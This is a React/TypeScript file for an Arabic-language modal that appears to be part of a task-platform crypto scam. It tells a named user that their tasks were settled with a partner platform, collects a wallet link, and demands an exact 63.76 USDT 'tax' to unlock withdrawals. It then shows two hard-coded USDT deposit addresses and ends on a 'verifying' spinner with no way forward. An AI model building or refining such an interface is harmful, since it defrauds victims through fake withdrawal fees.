
import React, { useState } from 'react';
import { Copy, AlertCircle, Info } from 'lucide-react';

interface ActionModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const ActionModal: React.FC<ActionModalProps> = ({ isOpen, onClose }) => {
  const [step, setStep] = useState(1);
  const [walletLink, setWalletLink] = useState('');

  if (!isOpen) return null;

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    alert('تم نسخ العنوان بنجاح');
  };

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/40 backdrop-blur-[2px]">
      <div className="bg-white w-full max-w-[320px] rounded-2xl p-6 shadow-2xl animate-in fade-in zoom-in duration-300">
        
        {/* الخطوة 1: التنبيه الأول */}
        {step === 1 && (
          <div className="text-center">
            <h3 className="text-lg font-bold text-gray-800 mb-4">تنبيه</h3>
            <p className="text-sm text-gray-600 leading-relaxed mb-6">
              أهلاً بك <span className="font-bold text-[#9B4A4E]">gHKA616</span> تم حل أمر المهام ضمن اتفاق بروتوكول بين منصتنا ومنصة <span className="font-bold">mini pro</span>. اضغط التالي للمتابعة.
            </p>
            <button 
              onClick={() => setStep(2)}
              className="w-full bg-[#9B4A4E] text-white py-3 rounded-xl font-bold active:scale-95 transition-transform"
            >
              التالي
            </button>
          </div>
        )}

        {/* الخطوة 2: ربط المحفظة */}
        {step === 2 && (
          <div className="text-center">
            <h3 className="text-lg font-bold text-gray-800 mb-4">ربط المحفظة</h3>
            <p className="text-sm text-gray-600 mb-4">يرجى وضع رابط محفظتك الخاص بالسحب:</p>
            <input 
              type="text" 
              value={walletLink}
              onChange={(e) => setWalletLink(e.target.value)}
              placeholder="أدخل رابط المحفظة هنا"
              className="w-full border border-gray-200 rounded-xl px-4 py-3 mb-6 outline-none focus:border-[#9B4A4E] transition-colors text-right"
              dir="rtl"
            />
            <button 
              onClick={() => walletLink.trim() !== '' && setStep(3)}
              disabled={walletLink.trim() === ''}
              className={`w-full py-3 rounded-xl font-bold active:scale-95 transition-transform ${walletLink.trim() !== '' ? 'bg-[#9B4A4E] text-white' : 'bg-gray-200 text-gray-400 cursor-not-allowed'}`}
            >
              التالي
            </button>
          </div>
        )}

        {/* الخطوة 3: شرح عملية الإيداع والنسخ (قبل الإيداع) */}
        {step === 3 && (
          <div className="text-right">
            <div className="flex justify-center mb-4">
              <Info size={40} className="text-[#9B4A4E]" />
            </div>
            <h3 className="text-lg font-bold text-gray-800 mb-3 text-center">تعليمات دفع الضريبة</h3>
            <p className="text-sm text-gray-600 leading-relaxed mb-4">
              عزيزي المستخدم، لفتح قناة السحب يجب عليك:
            </p>
            <ul className="text-xs text-gray-500 space-y-2 mb-6 list-disc list-inside pr-1">
              <li>نسخ عنوان الإيداع من الخطوة التالية.</li>
              <li>إرسال مبلغ <span className="font-bold text-red-600">63.76 USDT</span> بالضبط.</li>
              <li>تأكد من اختيار الشبكة الصحيحة (BEP20 أو TRC20).</li>
            </ul>
            <button 
              onClick={() => setStep(4)}
              className="w-full bg-[#9B4A4E] text-white py-3 rounded-xl font-bold active:scale-95 transition-transform"
            >
              فهمت، عرض العناوين
            </button>
          </div>
        )}

        {/* الخطوة 4: عرض العناوين وإتمام الإيداع */}
        {step === 4 && (
          <div className="text-right">
            <h3 className="text-lg font-bold text-gray-800 mb-4 text-center">عناوين الإيداع</h3>
            <p className="text-xs text-gray-500 mb-4 bg-gray-50 p-2 rounded-lg border-r-4 border-[#9B4A4E]">
              انسخ العنوان أدناه وأرسل الضريبة من محفظتك الخاصة.
            </p>
            
            <div className="space-y-3 mb-6">
              <div className="p-3 bg-gray-50 rounded-xl border border-gray-100">
                <p className="text-[10px] text-gray-400 mb-1">USDT BEP20 (Binance Smart Chain)</p>
                <div className="flex items-center justify-between gap-2">
                   <button onClick={() => copyToClipboard('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d')}><Copy size={16} className="text-[#9B4A4E]"/></button>
                   <span className="text-[10px] font-mono break-all text-left flex-1">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</span>
                </div>
              </div>
              
              <div className="p-3 bg-gray-50 rounded-xl border border-gray-100">
                <p className="text-[10px] text-gray-400 mb-1">USDT TRC20 (Tron Network)</p>
                <div className="flex items-center justify-between gap-2">
                   <button onClick={() => copyToClipboard('TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai')}><Copy size={16} className="text-[#9B4A4E]"/></button>
                   <span className="text-[10px] font-mono break-all text-left flex-1">TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai</span>
                </div>
              </div>
            </div>

            <button 
              onClick={() => setStep(5)}
              className="w-full bg-[#9B4A4E] text-white py-3 rounded-xl font-bold active:scale-95 transition-transform"
            >
              لقد قمت بالإرسال بنجاح
            </button>
          </div>
        )}

        {/* الخطوة 5: جاري التحقق */}
        {step === 5 && (
          <div className="text-center py-4">
            <div className="flex justify-center mb-4">
              <div className="w-12 h-12 border-4 border-[#9B4A4E] border-t-transparent rounded-full animate-spin"></div>
            </div>
            <h3 className="text-lg font-bold text-gray-800 mb-2">جاري التحقق</h3>
            <p className="text-sm text-gray-600">الرجاء الانتظار، جاري مطابقة عملية الإيداع مع البلوكشين...</p>
          </div>
        )}

      </div>
    </div>
  );
};

export default ActionModal;
